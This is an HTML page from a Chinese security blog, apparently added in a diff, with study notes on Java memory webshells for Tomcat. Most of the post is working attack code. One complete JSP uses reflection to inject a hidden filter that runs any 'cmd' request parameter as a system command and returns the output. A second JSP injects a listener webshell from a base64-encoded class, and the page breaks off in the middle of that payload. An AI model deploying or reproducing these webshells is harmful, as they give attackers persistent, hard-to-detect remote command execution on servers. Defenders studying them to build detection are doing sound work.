@@ -1,0 +1,587 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    
+    Aiyakami的博客
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+  
+    <meta name="description" content="内存马的一些学习Java EE架构内存马包括Listener型，Filter型，Servlet型内存马，实现了java EE规范的web服务器就包括上述三种概念 各请求处理顺序如下： 1234567891011121314151617181920212223请求到达│├─ (1) Listener（监听请求&#x2F;Session创建事件）│   ├─ ServletRequestListener.req">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Aiyakami的博客">
+<meta property="og:url" content="http://example.com/2025/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0output/index.html">
+<meta property="og:site_name" content="Aiyakami的博客">
+<meta property="og:description" content="内存马的一些学习Java EE架构内存马包括Listener型，Filter型，Servlet型内存马，实现了java EE规范的web服务器就包括上述三种概念 各请求处理顺序如下： 1234567891011121314151617181920212223请求到达│├─ (1) Listener（监听请求&#x2F;Session创建事件）│   ├─ ServletRequestListener.req">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220812-5do4tad.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220812-qhhei52.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220812-yxl4fdm.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220813-lihlcsi.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220813-qp4qzsq.png">
+<meta property="article:published_time" content="2025-04-12T14:10:30.145Z">
+<meta property="article:modified_time" content="2025-04-12T14:09:16.471Z">
+<meta property="article:author" content="aiyakami">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220812-5do4tad.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Aiyakami的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Aiyakami的博客</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+            <a href="/" id="subtitle">我无法原理那个明明什么都没做却一直期待着的自己</a>
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-内存马的一些学习output" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0output/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-12T14:10:30.145Z" itemprop="datePublished">2025-04-12</time>
+    <time style="display: none;" id="post-update-time">2025-04-12</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="内存马的一些学习"><a href="#内存马的一些学习" class="headerlink" title="内存马的一些学习"></a>内存马的一些学习</h1><h3 id="Java-EE架构内存马"><a href="#Java-EE架构内存马" class="headerlink" title="Java EE架构内存马"></a>Java EE架构内存马</h3><p>包括Listener型，Filter型，Servlet型内存马，实现了java EE规范的web服务器就包括上述三种概念</p>
+<p>各请求处理顺序如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">请求到达</span><br><span class="line">│</span><br><span class="line">├─ (<span class="number">1</span>) Listener（监听请求/Session创建事件）</span><br><span class="line">│   ├─ ServletRequestListener.requestInitialized()</span><br><span class="line">│   └─ HttpSessionListener.sessionCreated()（如创建新Session）</span><br><span class="line">│</span><br><span class="line">├─ (<span class="number">2</span>) Filter链（前置处理）</span><br><span class="line">│   ├─ Filter1.doFilter()（前半部分）</span><br><span class="line">│   ├─ Filter2.doFilter()（前半部分）</span><br><span class="line">│   └─ ...</span><br><span class="line">│</span><br><span class="line">├─ (<span class="number">3</span>) Servlet处理</span><br><span class="line">│   ├─ service() → doGet()/doPost()/...</span><br><span class="line">│   └─ 生成响应</span><br><span class="line">│</span><br><span class="line">├─ (<span class="number">4</span>) Filter链（后置处理，倒序）</span><br><span class="line">│   ├─ ... </span><br><span class="line">│   ├─ Filter2.doFilter()（后半部分）</span><br><span class="line">│   └─ Filter1.doFilter()（后半部分）</span><br><span class="line">│</span><br><span class="line">└─ (<span class="number">5</span>) Listener（监听请求/Session销毁事件）</span><br><span class="line">    ├─ ServletRequestListener.requestDestroyed()</span><br><span class="line">    └─ HttpSessionListener.sessionDestroyed()（如Session失效）</span><br></pre></td></tr></table></figure>
+
+<p><strong>环境搭建</strong></p>
+<p>使用tomcat8.5.95，JDK 8u391</p>
+<p>项目组件选择servlet即可</p>
+<p>​<img src="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220812-5do4tad.png">​</p>
+<h4 id="filter内存马"><a href="#filter内存马" class="headerlink" title="filter内存马"></a>filter内存马</h4><p>添加一个filter类型的内存马</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;evil&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Do Filter ......&quot;</span>);</span><br><span class="line">                String cmd;</span><br><span class="line">                <span class="keyword">if</span> ((cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    java.io.<span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                    servletResponse.getOutputStream().flush();</span><br><span class="line">                    servletResponse.getOutputStream().close();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">                System.out.println(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p>​<img src="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220812-qhhei52.png">​</p>
+<h4 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h4><p>使用JMG生成内存马</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        classLoader.loadClass(<span class="string">&quot;org.apache.commons.lang.n.ThreadUtil&quot;</span>).newInstance();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytecodeBase64</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADEBjQEAJG9yZy9hcGFjaGUvY29tbW9ucy9sYW5nL24vVGhyZWFkVXRpbAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAxnZXRDbGFzc05hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBACRvcmcuanVuaXQuU2VydmxldFJlcXVlc3RGZXpqTGlzdGVuZXIIAAgBAA9nZXRCYXNlNjRTdHJpbmcBAApFeGNlcHRpb25zAQATamF2YS9pby9JT0V4Y2VwdGlvbgcADAEAEGphdmEvbGFuZy9TdHJpbmcHAA4BC8hINHNJQUFBQUFBQUEvNDFYZVZ3VTV4bCtQblpobG1VMWNWRVViWk40dzdLd1NEUWk1RkFVQWdwbzNCU0R4TFRETU1Eb3Vydk96S0xZeHJTcFRaczBUZSttNlgwa3BXMXNxMjFjVktveDlraWIza2Q2MzNmVDl2LytrNmJQTnpNc3NDemlqMldPNzN2ZjUzMi81ejIrYjE3NDM0VkxBRGJnUHdKclV1WlE3R0FtYWRpeHVHNk9KSFI3cjM0a28xdDJtMzc4WUtkaDJYcFNOeFVJZ1NVSDFSRTFsbENUUTdIdENkV3lPbFBxZ0p6eUVVUk9IWXRaTGtBZTBCUklzVURKclFaTjNTN2dxNnJ1RWZCdlR3M29BdGQxR2ttOU8zTzRYemZ2VnZzVEhBbDNwalExMGFPYWhuejNCdjMyc0dFSnJPdThGcCtiUTFBUUNNS1BoUUxMcXpvTGV0OHNuUkNhd05JNTVpWEk5UktrbkhKREpLR3FyNlU2WDdhWmMvMENSWDB0QW1VRCtpQVg0NHdUbHVJZEhiTVZRcWpFY2dtN1F1QjYwM1YrQi8vTjFLZyt3Qlc2N3M3RmFPdUluclFkMTh1dDJSTUNxNjlCbXhSN2RqdklvNkVtak9QU2N2bVVwNjNITkQxdEc2bWtnbFZjdUllcG1hTnBPeFhiYnFTSFNZOUF3TlN0ZENwcE1UejVUZy9iZGpyV3prdk92aXRKTGNYU0xZdlFBamZOcmVSSVVOaVg2ajhvYzhSeExXTWJpVmlYbXBZZzNnSUUxczlyMlJHa3pzcDVtVkZRSzdEMm12QVV4QmlyYTF1MGdnMENOMXg5clFwdUZsZ3dZNWtLTm5Fb2JxdmFJYjU1ZGJCb1NMZG5la0llcTZxdkduV21YQ08yQkZHSEpvSGdzQzZ6dTFzOTdKVGFWTXpqdG1ra2h5aDdLMjRyUlJGWXFLVTAxdTZJNS9KeWhteDFJZld0MkZhR2VzaDZjRTMxcUltTUhzSU9GN2FWV1ordnBlQk9acE9XU3RxcWtXVHBySmhSc3NPcUdaY0xTV3A2Yy9YK0VEcXdNNGgyN0JLb0dKb2l1YzFNSGM0eGN0ZjgrZWd5azAvY25Ia2JRaGU2Zy9SL055bDBZdUFsOGFwWjVNOUs0eER1d2w3SlNaenhtd3B4dTJvTk8yRitUUkE5V0JoQURmTTluYUg3amRQWHY3di9vSzdaemJOSHFtY1BoZENML1dXNEJYMEJyQTFnUFp0VEpvRFhzbjJtMlhwQ1VOMFlzR0VGYU1nSkRDdW9RR1FMV09zSllRQjZHVFppa0g1dWE0MEhNT3cxamJ6V29JQTFXMGFTT3BLV3JUSnNBdFZ6Wms5K1d3a2hnY05CSEFLNXZYR0dnSlhXTldhMlp1cjJMbjAwempjRmFhNkVobHBHYloxNTQ2K3E3bXNKd1lRbEU4UjJlM0FCd3oyeXRZOEVjUVJIcVNSM0pTbmE0VXBhdXBZeERYczBSaU9PNkNpT1MzOWVQeU54WFZZVTNPODY0UFg4OHFwQy9mNEJ2REdJRTNnVEcxbmVwSUkzQ3l5YzFIZjNIWUhLMlNpNUxla3RlQ2lJazNpclRNVnl0MEwzZWhXNmZGTE5TTVZhTW9PRHVxa1B1SFBVZXdSdmx4bjRLSXVtc0l5Q3g1eU9yZzdJRFZsZ2NWWEI2bjRYM2gzRU8vRWVnVkMvYXVtM2JOeWhhODQrWGxFb3dqSWE3OFA3cGJNZllOTWVTTFVaU1RYQm80RGNTdVhrQi9HRTVQWkRJU3hCaFJUN0NETW5xUitkeXB5WmZ1VHkvR1A0dU9UaEU4UmlLYXNKUys3UEJiS1cvZUpUK0xTay8wa1dibTVmbzNneHFXdnJtYmZZQ3JTNm5CTmorS3owK1hOZWQzZG51MVB4akRiY1p1aUpnV25iNk5OTXRCSFYzRFM1NjgwdDIreEsxcy9zenA1TmQyNkRlMnRncWt3VE1mWEJCR1ZpRHB3bnlVMWxVWUVqeTlJNXRCUmttZVVraGxGTnFNd05aMVNnZHA3bVA5TjBDT2R3WGtibkF2Y3YyU3N6YWQzVUVrNEgrcXFzaFpPNG1CZXVHWlg1YkJDbmNKbTZsbTV2MHpUWlJkMHpZTlYrS1hBRlh3dGlIRjluRnlKNDNzNTB0ZDc0VFR3dkZiL0YyTk9iNDhkbFJqclphMDZlY2ZKT1AvSUF3b01aazl2S0pPc09HNVpXMTdJdDNqcVo5R1lBM3lmR1lNcmJUZGZPdzlKa1AvZ2hmaVE1K0RGcnlMWHZWbUlBUDNVTHVrdTNoMU5rZldzQnZMNVplSVhpNENMUTFNL3djMm5xRndMTDVwSlM4Q3NXa1pFY1NSM2lHcllVSUxQdkd2bjlEWDRieEsveE93WEx2RjVaSnplNnVoYW5VUVR3UjNmcnpKSDNaOXAxQ1FqZ3I5U29iOVMyTk5hcjlRMWI5RTJEL1ExYUFIOG52WHQxMmFVby9rKys3RXdjSFVrT2NPWmZXTW5LODRNUThQSEtuWTJmTlVJZVhwejdEdWNlNEpQaVhFdjUxa29Od2Z2U3lEaXVpNFQvY1JaYUpQelNXZHdSQ2YvN0xOck9jS29JUVY1bFVRTVYvRnVLTWo2RlhEWGVGempnL0M3d0lQZFFVc291aTlTTVkvSDhtTXVKc3NMQnJIRDFQRXo1dEFoaG9nclpDVDMwMjdoQUtWVWFxZkhWWEJySHEwN240RW9jbDI2Y0JsV2FneXFsa1dVTzFLdHhnd2UxeWRHazgyZnlJTlpNZ3hBNUNPNjl1TW1CV0RrSklaNmtoc0s1S3pWWk5GOUdmVmMwOGd6dU9JL3RSYXlzcDZkZStOQ1dSZWNUZUR3U0hjZWU3dWg1M0MzUTVKOUFUKzg0OWpVVlZ4YUg3K0hndlQ3czQrT0IydHpqZlpWKzc5a2ZmaDFodFBNWThpRnNuRU9xcWFTeXBIZ0NSM3JsY0JhWnNER09ZMW04WVFKRnZaRXNIc3ppYmVONHVMSWtRdUIzQ0dUeDNpd2V6K0xEV1h3MGkwOVdGbWZ4MUw0eEZEZVZqTUhmZlVhZWdkaWtKckNheVhFUmwzbjNPWnkwTVFyQWVvNVc4eStDR0dxd0dWRWVhbXV4aXdmb0hvNzA4K3M1aFFhTTRHWTh5dVBRT1o2M0prandSVFFScVJIUE1Ra2xwKzN5a0lFV0lxNGhjekU4aHJWWVJ6dWI4UkF0VkRHMlczRy9ZNlZZc3Byai9vckhmUUFYYUQxS1h6ZHpkQjM4cjlCTWlZSWlCWFVLNmhVMEtOaW8wTGhRc1BxL0VDMjh5ZGp5b01yclo2Z2p5Mk8xRS81MmprZ3JVZEZWRTc3bkhENGZQc0RMWlRSMGphR3l1MmJhVzZESlB3WWZmOUhUVG00dndtSmlMS0ZQcXlROHZlV3V4M0dKK2lKWEkxRWJSWmVNUVhkdCtNUlRxS2hsZmt3UWFVR1R2emFMUzkxanI3d1VmUjZoQ1p6cVpaRTg5MnpVbjhVM29sVDQ5bW42dHdEbHpMNVRIdjhOWkFIWVR2d2RaSytOcysyYzc2REVUcWIwTGlaMEo3blpUVWIzTUNKN0tSOTN1TjVJUDVieC93djRJbGROai9BbG5IYlliTVFaMWhHLzBFblVsL0VWM3ZrNWhtZHcxb2tFdUQ3L3kxQVVqQ3M0MmEzZ1ZHbG9HblZDbmw2OHhiN01JTXJGam9aL2NBNC82WXFHWC9SZnhNbGVYN2c5bnNVdm84d3l2cC9vOWRYdzlmZVg4WWZjNzNSWCtFL1VJRHQvOFZHRHdvTDNFNVJxOGxlU2l3ZkRmNXVPVk9tZkM4ZXAxM3A2UDVtdHkra1NlT1F2d1g2TzlwR05lN25lQStUb1BvZVYyemxUd2h4Nmdhc3Q0c3cyNThuSCtWcDhoL3o0cVhFbk9mdXVVLzJqdVF3Y3hmY2N6amE3WGVLSVRLd3BVdkIvOHpQQ1hrUVNBQUE9CAAQAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAASABMKAA8AFAEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HABcBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAhsaXN0ZW5lcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAB2NvbnRleHQBAAhjb250ZXh0cwEAEExqYXZhL3V0aWwvTGlzdDsBAAR0aGlzAQAmTG9yZy9hcGFjaGUvY29tbW9ucy9sYW5nL24vVGhyZWFkVXRpbDsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAkTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAOamF2YS91dGlsL0xpc3QHACQBABJqYXZhL3V0aWwvSXRlcmF0b3IHACYBAA1TdGFja01hcFRhYmxlDAASABYKAAQAKQEAD2J5cGFzc0pES01vZHVsZQwAKwAWCgACACwBAApnZXRDb250ZXh0AQASKClMamF2YS91dGlsL0xpc3Q7DAAuAC8KAAIAMAEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwAMgAzCwAlADQBAAdoYXNOZXh0AQADKClaDAA2ADcLACcAOAEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAOgA7CwAnADwBAAtnZXRMaXN0ZW5lcgEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAA+AD8KAAIAQAEAC2FkZExpc3RlbmVyAQAnKExqYXZhL2xhbmcv